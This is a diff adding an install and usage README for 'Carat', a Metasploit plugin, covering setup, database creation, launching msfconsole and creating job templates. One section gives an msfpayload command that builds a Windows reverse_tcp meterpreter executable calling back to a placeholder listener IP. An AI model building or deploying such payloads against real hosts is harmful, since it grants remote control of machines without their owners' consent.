@@ -1,0 +1,100 @@
+##############################################################################
+##                                                                          ##
+##                     Installation and Usage of Carat                      ##
+##                                                                          ##
+##############################################################################
+
+---=[ Install ruby 1.9.2 on OSX ]
+
+   - remove all ruby with 
+        port uninstall rubystuff
+        port clean rubystuff
+        
+        sudo port install ruby19 +nosuffix
+        sudo gem install sqlite3-ruby
+        
+
+
+---=[ Installing Metasploit Framework
+
+	install metasploit using svn
+
+---=[ Install the Carat plugin
+
+	Install the plugin wherever you want
+
+   	e.g.:
+		# mkdir /opt/carat
+		# cd /opt/carat
+		# git clone carat:carat.git
+		
+	Create symbolic links to integrate Carat within the MSF
+	
+	e.g.:
+		# ln -s src_minimal/carat.rc ${MSF}/
+		# ln -s src_minimal/plugins/carat.rb ${MSF}/plugins/
+		# ln -s src_minimal/plugins/carat ${MSF}/plugins/
+		# ln -s scr_minimal/msf_modules/outbound.rb ${MSF}/modules/auxiliary/server/capture/outbound.rb
+
+---=[ Generate the Database 
+    mkdir -p ${MSF}/plugins/carat/sqlitedb
+    sqlite3 carat.db
+    withing sqlite3 type:
+    CREATE TABLE Job (JobID INTEGER PRIMARY KEY AUTOINCREMENT, JobDescription TEXT, JobStatus INTEGER NOT NULL, Match TEXT NOT NULL );
+    .quit
+
+---=[ Starting Carat
+
+	Start Metasploit with the included .rc file
+	e.g.:
+		# cd ${MSF}
+		# ./msfconsole -r carat.rc
+		
+		# Please note, if you use the ouboundtest or any other command that needs to bind a restricted port number etc
+		# you need to execute msf as root.
+		
+	Parameters used by carat.rc
+  
+      logdir       = "${MSF}/plugins/carat/var/log" 
+      db           = "${MSF}/plugins/carat/var/sqlitedb/carat.db" 
+      templatesdir = "${MSF}/plugins/carat/var/templates" 
+      jobsdir      = "${MSF}/plugins/carat/var/jobs" 
+      resultsdir   = "${MSF}/plugins/carat/var/results"
+      
+	
+
+---=[ Manual building of the client executable
+
+	Build a reverse meterpreter executable that needs to be executed ad the 
+	to be analyzed host:
+
+		# ./msfpayload windows/meterpreter/reverse_tcp \
+		> LHOST=IP.OF.YOUR.LISTENING.METASPLOIT \
+		> LPORT=5555 X > meterpreter-exe.exe
+		
+---=[ How to setup a simple job 
+
+Setting um a simple job is simple. 
+
+1.) create the job template
+
+    mkdir ${MSF}/plugins/carat/var/templates/win32_simple
+    echo 'remote_MsgboxA("Hello form Carat","Carat Message Box")' > ${MSF}/plugins/carat/var/templates/win32_simple/main.ins
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		
+---=[ EOF
